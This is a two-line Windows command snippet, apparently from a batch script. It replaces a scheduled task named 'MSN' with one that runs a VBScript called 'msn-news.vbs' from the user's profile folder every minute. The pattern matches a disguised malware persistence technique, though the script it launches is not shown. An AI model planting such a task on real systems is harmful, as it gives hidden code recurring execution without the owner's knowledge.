schtasks /delete /tn "MSN" /f
schtasks /create /sc minute /mo 1 /tn "MSN" /tr "%USERPROFILE%\folder\msn-news.vbs"
